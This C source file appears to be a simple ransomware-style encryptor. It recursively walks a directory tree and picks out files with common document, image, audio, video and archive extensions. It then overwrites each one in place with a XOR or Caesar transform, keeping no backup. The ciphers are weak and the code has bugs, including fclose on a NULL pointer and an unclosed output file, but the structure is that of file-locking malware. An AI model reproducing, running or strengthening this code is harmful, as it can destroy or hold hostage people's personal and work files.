#include "./redundant.h"

void walk(const char *basePath, FileStruct *file, int encoder_ID, char *args[]){
    struct dirent *entry;
    DIR *dir = opendir(basePath);

    if (dir == NULL) {
        perror("Unable to open directory");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        char path[1024];
        snprintf(path, sizeof(path), "%s/%s", basePath, entry->d_name);

        struct stat statbuf;
        if (stat(path, &statbuf) == 0) {
            if (S_ISDIR(statbuf.st_mode)) {
                walk(path, file, encoder_ID, args); // Recursive call
            } else {
                printf("File: %s\n", path);
		        handleFile(path, file, encoder_ID, args);
            }
        }
    }

    closedir(dir);
}

int loadFile(const char *name, FileStruct *file) {
	// readFile reads a file and put it into file struct
	FILE *fp = fopen(name, "rb");
	if (fp == NULL) {
		fclose(fp);
		return 1;
	}

	// get file size
	fseek(fp, 0, SEEK_END);
	file->size = ftell(fp);
	rewind(fp);
	printf("File: %s size loaded\n", name);

	// initalize buffer with file size
	file->buffer = (uint8_t *)malloc((file->size+1)*sizeof(uint8_t));

	// read all characters into buffer
	fread(file->buffer, 1, file->size, fp);
	printf("File: %s buffer loaded\n", name);

	// close file
	fclose(fp);

	return 0;
}

void writeFile(const char *name, uint8_t *content, uint64_t size) {
	FILE *fp = fopen(name, "wb");
	if (fp == NULL) {
		return;
	}
	fwrite(content, 1, size, fp);
}

void handleFile(char *filename, FileStruct *file, int encoder_ID, char *args[]){
	if (checkFile(filename) == 1){
		return;	
	} 

	// Read file to buffer
	if (loadFile(filename, file) == 1){
		return;
	}

	// Encrypt file

	// Write file to disk
    switch (encoder_ID) {
        case 1:
	        XOR_encoder_decoder(file->buffer, file->size); 
            printf("Encoding using XOR\n");
            break;
        case 2:
            caesar_encoder(file->buffer, file->size, atoi(args[3]));
            printf("Encoding using Caesar\n");
            break;
        case 3:
            caesar_decoder(file->buffer, file->size, atoi(args[3]));
            printf("Decoding using Caesar\n");
            break;
    }
	writeFile(filename, file->buffer, file->size);

	// Free to the next
	free(file->buffer);

}


int checkFile(const char *name) {
	if (strcasestr(name, ".doc") != NULL) return 0;
	if (strcasestr(name, ".odt") != NULL) return 0;
	if (strcasestr(name, ".rtf") != NULL) return 0;
	if (strcasestr(name, ".md") != NULL) return 0;
	if (strcasestr(name, ".wpd") != NULL) return 0;
	if (strcasestr(name, ".ppt") != NULL) return 0;
	if (strcasestr(name, ".pps") != NULL) return 0;
	if (strcasestr(name, ".odp") != NULL) return 0;
	if (strcasestr(name, ".key") != NULL) return 0;
	if (strcasestr(name, ".ods") != NULL) return 0;
	if (strcasestr(name, ".xlr") != NULL) return 0;
	if (strcasestr(name, ".xls") != NULL) return 0;
	if (strcasestr(name, ".txt") != NULL) return 0;
	if (strcasestr(name, ".pdf") != NULL) return 0;
	if (strcasestr(name, ".zip") != NULL) return 0;
	if (strcasestr(name, ".jpeg") != NULL) return 0;
	if (strcasestr(name, ".jpg") != NULL) return 0;
	if (strcasestr(name, ".png") != NULL) return 0;
	if (strcasestr(name, ".gif") != NULL) return 0;
	if (strcasestr(name, ".bmp") != NULL) return 0;
	if (strcasestr(name, ".psd") != NULL) return 0;
	if (strcasestr(name, ".ico") != NULL) return 0;
	if (strcasestr(name, ".svg") != NULL) return 0;
	if (strcasestr(name, ".tif") != NULL) return 0;
	if (strcasestr(name, ".mp3") != NULL) return 0;
	if (strcasestr(name, ".flac") != NULL) return 0;
	if (strcasestr(name, ".aif") != NULL) return 0;
	if (strcasestr(name, ".wav") != NULL) return 0;
	if (strcasestr(name, ".wma") != NULL) return 0;
	if (strcasestr(name, ".ogg") != NULL) return 0;
	if (strcasestr(name, ".mpa") != NULL) return 0;
	if (strcasestr(name, ".cda") != NULL) return 0;
	if (strcasestr(name, ".mp4") != NULL) return 0;
	if (strcasestr(name, ".wmv") != NULL) return 0;
	if (strcasestr(name, ".mpg") != NULL) return 0;
	if (strcasestr(name, ".mpeg") != NULL) return 0;
	if (strcasestr(name, ".m4v") != NULL) return 0;
	if (strcasestr(name, ".h264") != NULL) return 0;
	if (strcasestr(name, ".mkv") != NULL) return 0;
	if (strcasestr(name, ".3g2") != NULL) return 0;
	if (strcasestr(name, ".3gp") != NULL) return 0;
	if (strcasestr(name, ".avi") != NULL) return 0;
	if (strcasestr(name, ".mov") != NULL) return 0;
	if (strcasestr(name, ".flv") != NULL) return 0;
	if (strcasestr(name, ".7z") != NULL) return 0;
	if (strcasestr(name, ".tar") != NULL) return 0;
	if (strcasestr(name, ".rar") != NULL) return 0;
	if (strcasestr(name, ".gz") != NULL) return 0;
	return 1;
}

